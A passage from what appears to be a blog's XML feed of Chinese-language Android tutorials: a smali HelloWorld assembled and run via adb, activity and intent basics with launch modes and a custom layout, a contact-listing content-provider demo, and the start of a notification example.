class="keyword">new</span> Fruit(<span class="string">"Strawberry"</span>, R.drawable.strawberry_pic);</div><div class="line">            fruitList.add(strawberry);</div><div class="line">            Fruit cherry = <span class="keyword">new</span> Fruit(<span class="string">"Cherry"</span>, R.drawable.cherry_pic);</div><div class="line">            fruitList.add(cherry);</div><div class="line">            Fruit mango = <span class="keyword">new</span> Fruit(<span class="string">"Mango"</span>, R.drawable.mango_pic);</div><div class="line">            fruitList.add(mango);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> MobSec </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[smali汇编学习]]></title>
      <url>/2017/03/05/%5B%E9%80%86%E5%90%91%E7%AF%87%5Dsmali%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"># HelloWorld.smali</div><div class="line">.class public LHelloWorld;	# 定义类名</div><div class="line">.super Ljava/lang/Object;	# 父类</div><div class="line">.method public static main([Ljava/lang/String;)V	#声明静态main()方法</div><div class="line">	.locals 3	#程序使用v0、v1、v2 以及一个参数</div><div class="line">	#.prologue		#代码起始指令</div><div class="line">	#数据定义指令</div><div class="line">	const/16 v0, 0x8</div><div class="line">	const/4 v1, 0x5</div><div class="line">	const/4 v2,	0x3</div><div class="line">	#数据操作指令</div><div class="line">	move v1, v2</div><div class="line">	#数组操作指令</div><div class="line">	new-array	v0,v0,[I</div><div class="line">	array-length v1,v0		#获取数组长度</div><div class="line">	#实例操作指令</div><div class="line">	new-instance v1,Ljava/lang/StringBuilder;</div><div class="line">	#方法调用</div><div class="line">	invoke-direct &#123;v1&#125;,Ljava/lang/StringBuilder;-&gt;&lt;init&gt;()V</div><div class="line">	#跳转指令</div><div class="line">	if-nez v0,:cond_0</div><div class="line">	goto :goto_0</div><div class="line">	:cond_0</div><div class="line">	#数据转换</div><div class="line">	int-to-float v2,v2</div><div class="line">	#数据运算指令</div><div class="line">	add-float v2,v2,v2</div><div class="line">	#比较指令</div><div class="line">	cmpl-float v0,v2,v2</div><div class="line">	#字段操作指令</div><div class="line">	sget-object v0,Ljava/lang/System;-&gt;out:Ljava/io/PrintStream;</div><div class="line">	const-string v1 , &quot;Hi,MobSec&quot;		#构造字符串</div><div class="line">	#方法调用</div><div class="line">	invoke-virtual &#123;v0,v1&#125;,Ljava/io/PrintStream;-&gt;println(Ljava/lang/String;)V</div><div class="line">	#返回指令</div><div class="line">	:goto_0</div><div class="line">	return-void</div><div class="line">.end method</div></pre></td></tr></table></figure>
<p>使用smali.jar将HelloWorld.smali编译为DEX文件<br>命令如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">java -jar smali.jar assemble -o HelloWorld.dex HelloWorld.smali</div></pre></td></tr></table></figure></p>
<p>接着，需要将这个smali压缩为zip格式的压缩包HelloWorld.zip<br>然后将这个压缩包拷贝到手机中，或者是模拟器中<br>adb命令如下<br><figure class="highlight bat"><table><tr><td class="code"><pre><div class="line">adb push HelloWorld.zip /data/local</div><div class="line">[<span class="number">100</span>%] /data/local/HelloWorld.zip</div><div class="line"><span class="function">E:\<span class="title">mobileSec</span>\<span class="title">tools</span>\<span class="title">build</span>&gt;<span class="title">adb</span> <span class="title">shell</span> <span class="title">dalvikvm</span> -<span class="title">cp</span> /<span class="title">data</span>/<span class="title">local</span>/<span class="title">HelloWorld.zip</span> <span class="title">HelloWorld</span></span></div><div class="line"><span class="function"><span class="title">Hi</span>,<span class="title">MobSec</span></span></div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> MobSec </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[android开发之activity]]></title>
      <url>/2017/03/05/%5B%E5%BC%80%E5%8F%91%E7%AF%87%5Dandroid%E5%BC%80%E5%8F%91%E4%B9%8Bactivity/</url>
      <content type="html"><![CDATA[<ol>
<li>Activity:界面交互</li>
<li>Intent: 数据传递</li>
</ol>
<p>###一个主界面<br><figure class="highlight xml"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".MyActivity"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>其中<code>&quot;android.intent.action.MAIN&quot;</code>表示主界面，apk启动时大多从这里开始启动.<br><code>&quot;android.intent.category.LAUNCHER&quot;</code>展示在系统的LAUNCHER中，没有这个就没有启动图标。</p>
<p>###创建一个菜单<br>首先创建一个菜单的布局文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;menu xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;</div><div class="line">    &lt;item</div><div class="line">        android:id=&quot;@+id/add_item&quot;</div><div class="line">        android:title=&quot;Add&quot;/&gt;</div><div class="line">    &lt;item</div><div class="line">        android:id=&quot;@+id/remove_item&quot;</div><div class="line">        android:title=&quot;Remove&quot;/&gt;</div><div class="line">    &lt;item</div><div class="line">        android:id=&quot;@+id/exit_item&quot;</div><div class="line">        android:title=&quot;Exit&quot;/&gt;</div><div class="line"></div><div class="line">&lt;/menu&gt;</div></pre></td></tr></table></figure></p>
<p>Activity中实现<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="comment">//设置菜单界面    </span></div><div class="line"><span class="comment">//返回值true表示显示    </span></div><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</div><div class="line">    getMenuInflater().inflate(R.menu.main,menu);</div><div class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//相应菜单事件</span></div><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</div><div class="line">    <span class="keyword">switch</span> (item.getItemId())</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">case</span> R.id.add_item:</div><div class="line">            Toast.makeText(MyActivity.<span class="keyword">this</span>,<span class="string">"add_item"</span>,Toast.LENGTH_SHORT).show();</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> R.id.remove_item:</div><div class="line">            Toast.makeText(MyActivity.<span class="keyword">this</span>,<span class="string">"remove_item"</span>,Toast.LENGTH_SHORT).show();</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> R.id.exit_item:</div><div class="line">            finish();</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">default</span>:</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>###界面间交互<br>用Intent进行参数传递<br>首先是 <code>AndroidManifest.xml</code>文件中如下声明<br><figure class="highlight xml"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".SecondActivity"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.cn.yllen.myapplication.ACTION_START"</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"com.cn.yllen.myapplication.MY_CATECORY"</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>####分别有<code>显式</code>、<code>隐式</code>两种intent方式启动activity<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line">button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</div><div class="line">        <span class="comment">//Toast.makeText(MyActivity.this,"Hi~~",Toast.LENGTH_SHORT).show();</span></div><div class="line">        <span class="comment">//显示 intent</span></div><div class="line">        <span class="comment">//Intent intent = new Intent(MyActivity.this,SecondActivity.class);</span></div><div class="line">        <span class="comment">//隐式 intent</span></div><div class="line">        Intent intent = <span class="keyword">new</span> Intent(<span class="string">"com.cn.yllen.myapplication.ACTION_START"</span>);</div><div class="line">        intent.addCategory(<span class="string">"com.cn.yllen.myapplication.MY_CATECORY"</span>);</div><div class="line">        startActivity(intent);</div><div class="line">    &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>####打开网页<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"></div><div class="line">Intent intent = <span class="keyword">new</span> Intent(Intent.ACTION_VIEW);</div><div class="line">intent.setData(Uri.parse(<span class="string">"http://ring3.xyz"</span>));</div><div class="line">Toast.makeText(SecondActivity.<span class="keyword">this</span>,Uri.parse(<span class="string">"http://ring3.xyz"</span>).toString(),Toast.LENGTH_SHORT).show();</div><div class="line">startActivity(intent);</div></pre></td></tr></table></figure></p>
<p>####传递参数 &amp; 接收参数<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line">String data = <span class="string">"你好世界"</span>;</div><div class="line">Intent intent = <span class="keyword">new</span> Intent(SecondActivity.<span class="keyword">this</span>,ThirdActivity.class);</div><div class="line">intent.putExtra(<span class="string">"extra_data"</span>,data);</div><div class="line">startActivity(intent);</div><div class="line"><span class="comment">/*-----------*---------------*-----------*/</span></div><div class="line">Intent intent = getIntent();</div><div class="line">String data = intent.getStringExtra(<span class="string">"extra_data"</span>);</div><div class="line">Log.d(TAG, <span class="string">"onCreate: "</span> + data);</div></pre></td></tr></table></figure></p>
<p>####启动activity并获取返回值<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="comment">// 通过startActivityForResult方法启动activity并获得返回数据</span></div><div class="line">Intent intent = <span class="keyword">new</span> Intent(SecondActivity.<span class="keyword">this</span>,ThirdActivity.class);</div><div class="line">startActivityForResult(intent,<span class="number">1</span>);</div><div class="line"></div><div class="line"><span class="comment">//同时需要重写 onActivityResult 方法，以便获取返回值</span></div><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="keyword">protected</span> </div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">onActivityResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="keyword">int</span> resultCode, Intent data)</span> </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">switch</span> (requestCode)</div><div class="line">    &#123;</div><div class="line">    <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">        <span class="keyword">if</span> (resultCode == RESULT_OK)</div><div class="line">        &#123;</div><div class="line">            String returnedData = data.getStringExtra(<span class="string">"ret_data"</span>);</div><div class="line">            Log.d(TAG, <span class="string">"onActivityResult: "</span> + returnedData);</div><div class="line">        &#125;</div><div class="line">    <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">default</span>:</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*----------------*------------*---------------*/</span></div><div class="line"><span class="comment">// 被启动的activity，通过 setResult方法 返回数据</span></div><div class="line">Button button = (Button) findViewById(R.id.button_3);</div><div class="line">    button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</div><div class="line">        <span class="meta">@Override</span></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</div><div class="line">            Intent intent = <span class="keyword">new</span> Intent();</div><div class="line">            intent.putExtra(<span class="string">"ret_data"</span>,<span class="string">"这是返回值哦~"</span>);</div><div class="line">            setResult(RESULT_OK,intent);</div><div class="line">            finish();</div><div class="line">        &#125;</div><div class="line">    &#125;);</div></pre></td></tr></table></figure></p>
<h3 id="activity生存期"><a href="#activity生存期" class="headerlink" title="activity生存期"></a>activity生存期</h3><p><img src="./16-01-58.jpg" alt=""><br><img src="./16-03-24.jpg" alt=""></p>
<h3 id="启动模式"><a href="#启动模式" class="headerlink" title="启动模式"></a>启动模式</h3><h4 id="声明方式"><a href="#声明方式" class="headerlink" title="声明方式"></a>声明方式</h4><figure class="highlight xml"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">activity</span></span></div><div class="line"><span class="tag">    <span class="attr">...</span>    </span></div><div class="line"><span class="tag">    <span class="attr">android:launchMode</span>=<span class="string">"xx"</span>&gt;</span></div><div class="line">    ...</div><div class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></div></pre></td></tr></table></figure>
<h4 id="standard：每次都生成一个新的activity放在栈顶"><a href="#standard：每次都生成一个新的activity放在栈顶" class="headerlink" title="standard：每次都生成一个新的activity放在栈顶"></a><code>standard</code>：每次都生成一个新的activity放在栈顶</h4><figure class="highlight java"><table><tr><td class="code"><pre><div class="line">startActivity(xx.<span class="keyword">this</span>,xx.class);</div><div class="line">startActivity(xx.<span class="keyword">this</span>,xx.class);</div><div class="line">startActivity(xx.<span class="keyword">this</span>,xx.class);</div><div class="line"><span class="comment">//则需要按三次back键进行返回</span></div></pre></td></tr></table></figure>
<h4 id="singleTop-仅当不在栈顶时生成"><a href="#singleTop-仅当不在栈顶时生成" class="headerlink" title="singleTop:仅当不在栈顶时生成"></a><code>singleTop</code>:仅当不在栈顶时生成</h4><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="comment">//当前界面可视</span></div><div class="line">startActivity(xx.<span class="keyword">this</span>,xx.class);   </div><div class="line">startActivity(xx.<span class="keyword">this</span>,xx.class);    </div><div class="line">startActivity(xx.<span class="keyword">this</span>,xx.class);    </div><div class="line"><span class="comment">//则需要按一次back键进行返回</span></div></pre></td></tr></table></figure>
<h4 id="singleTask-全栈唯一"><a href="#singleTask-全栈唯一" class="headerlink" title="singleTask:全栈唯一"></a><code>singleTask</code>:全栈唯一</h4><h4 id="singleInstance-多栈"><a href="#singleInstance-多栈" class="headerlink" title="singleInstance:多栈"></a><code>singleInstance</code>:多栈</h4><h4 id="自定布局"><a href="#自定布局" class="headerlink" title="自定布局"></a><code>自定布局</code></h4><p>首先自己完成一个布局类的子类<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">package</span> com.cn.yllen.myapplication;</div><div class="line"></div><div class="line"><span class="keyword">import</span> android.content.Context;</div><div class="line"><span class="keyword">import</span> android.util.AttributeSet;</div><div class="line"><span class="keyword">import</span> android.view.LayoutInflater;</div><div class="line"><span class="keyword">import</span> android.view.View;</div><div class="line"><span class="keyword">import</span> android.widget.Button;</div><div class="line"><span class="keyword">import</span> android.widget.LinearLayout;</div><div class="line"><span class="keyword">import</span> android.widget.Toast;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * Created by Administrator on 2017/2/27 0027.</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TitleLayout</span> <span class="keyword">extends</span> <span class="title">LinearLayout</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TitleLayout</span><span class="params">(<span class="keyword">final</span> Context context , AttributeSet attrs)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">super</span>(context,attrs);</div><div class="line">        LayoutInflater.from(context).inflate(R.layout.layout_title,<span class="keyword">this</span>);</div><div class="line">        Button button1 = (Button) findViewById(R.id.title_back);</div><div class="line">        button1.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</div><div class="line">                Toast.makeText(context,<span class="string">"back"</span>,Toast.LENGTH_SHORT).show();</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>对应的xml布局文件<code>layout_title.xml</code>实现如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></div><div class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:background</span>=<span class="string">"@drawable/title_bg"</span>&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">Button</span></span></div><div class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/title_back"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">"center"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_margin</span>=<span class="string">"3dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">"@drawable/back_bg"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Back"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:textColor</span>=<span class="string">"#fff"</span></span></div><div class="line"><span class="tag">        /&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></div><div class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/title_text"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"0dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">"center"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:gravity</span>=<span class="string">"center"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Title text"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:textColor</span>=<span class="string">"#fff"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:textSize</span>=<span class="string">"24sp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">"@drawable/title_bg"</span></span></div><div class="line"><span class="tag">        /&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">Button</span></span></div><div class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/button_3"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">"center"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_margin</span>=<span class="string">"3dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">"@drawable/edit_bg"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:textColor</span>=<span class="string">"#fff"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"确定3"</span></span></div><div class="line"><span class="tag">        /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></div></pre></td></tr></table></figure>
<p>将上面布局文件引入其他布局中<br><figure class="highlight xml"><table><tr><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></div><div class="line"><span class="tag"><span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></div><div class="line"><span class="tag"><span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">com.cn.yllen.myapplication.TitleLayout</span></span></div><div class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">com.cn.yllen.myapplication.TitleLayout</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>效果图如下:<br><img src="./22-06-55.jpg" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> MobSec </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[android开发之内容提供者]]></title>
      <url>/2017/03/05/%5B%E5%BC%80%E5%8F%91%E7%AF%87%5Dandroid%E5%BC%80%E5%8F%91%E4%B9%8B%E5%86%85%E5%AE%B9%E6%8F%90%E4%BE%9B%E8%80%85/</url>
      <content type="html"><![CDATA[<p>一个获取手机联系人小Demo<br>布局文件如下<br><figure class="highlight xml"><table><tr><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></div><div class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></div><div class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">"com.cn.yllen.contentprovider.MainActivity"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">ListView</span></span></div><div class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/conent_view"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span><span class="tag">&lt;/<span class="name">ListView</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>加入权限申明<br><figure class="highlight xml"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_CONTACTS"</span> &gt;</span><span class="tag">&lt;/<span class="name">uses-permission</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>实现代码如下<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> android.database.Cursor;</div><div class="line"><span class="keyword">import</span> android.provider.ContactsContract;</div><div class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</div><div class="line"><span class="keyword">import</span> android.os.Bundle;</div><div class="line"><span class="keyword">import</span> android.view.View;</div><div class="line"><span class="keyword">import</span> android.widget.ArrayAdapter;</div><div class="line"><span class="keyword">import</span> android.widget.ListView;</div><div class="line"></div><div class="line"><span class="keyword">import</span> java.util.ArrayList;</div><div class="line"><span class="keyword">import</span> java.util.List;</div><div class="line"><span class="keyword">import</span> java.util.concurrent.ExecutionException;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</div><div class="line"></div><div class="line">    List&lt;String&gt; contactsList = <span class="keyword">new</span> ArrayList&lt;&gt;();</div><div class="line">    ArrayAdapter&lt;String&gt; adapter;</div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line">        ListView view = (ListView) findViewById(R.id.conent_view);</div><div class="line">        adapter = <span class="keyword">new</span> ArrayAdapter(<span class="keyword">this</span>,android.R.layout.simple_expandable_list_item_1,contactsList);</div><div class="line">        view.setAdapter(adapter);</div><div class="line">        readContacts();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readContacts</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        Cursor cursor = <span class="keyword">null</span>;</div><div class="line">        <span class="keyword">try</span></div><div class="line">        &#123;</div><div class="line">            cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</div><div class="line">            <span class="keyword">if</span> (cursor != <span class="keyword">null</span>)</div><div class="line">            &#123;</div><div class="line">                <span class="keyword">while</span>(cursor.moveToNext())</div><div class="line">                &#123;</div><div class="line">                    <span class="comment">//联系人</span></div><div class="line">                    String displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));</div><div class="line">                    <span class="comment">//手机号</span></div><div class="line">                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));</div><div class="line">                    contactsList.add(displayName + <span class="string">"\n"</span> + number);</div><div class="line">                &#125;</div><div class="line">                adapter.notifyDataSetChanged();</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">catch</span> (Exception e)</div><div class="line">        &#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;<span class="keyword">finally</span> &#123;</div><div class="line">            <span class="keyword">if</span> (cursor != <span class="keyword">null</span>)</div><div class="line">                cursor.close();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> MobSec </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[android开发之通知栏消息]]></title>
      <url>/2017/03/03/%5B%E5%BC%80%E5%8F%91%E7%AF%87%5Dandroid%E5%BC%80%E5%8F%91%E4%B9%8B%E9%80%9A%E7%9F%A5%E6%A0%8F%E6%B6%88%E6%81%AF/</url>
      <content type="html"><![CDATA[<p>Demo功能，在A中点击按钮，弹出通知栏消息，点击消息之后转入B中，实现如下:<br><code>MainActivity</code>的布局<br><figure class="highlight xml"><table><tr><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">RelativeLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></div><div class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:paddingBottom</span>=<span class="string">"@dimen/activity_vertical_margin"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:paddingLeft</span>=<span class="string">"@dimen/activity_horizontal_margin"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:paddingRight</span>=<span class="string">"@dimen/activity_horizontal_margin"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:paddingTop</span>=<span class="string">"@dimen/activity_vertical_margin"</span></span></div><div class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">"com.cn.yllen.notificationtest.MainActivity"</span>&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">Button</span></span></div><div class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/button_notifiy"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Send notice"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">RelativeLayout</span>&gt;</span></div></pre></td></tr></table></figure></p>
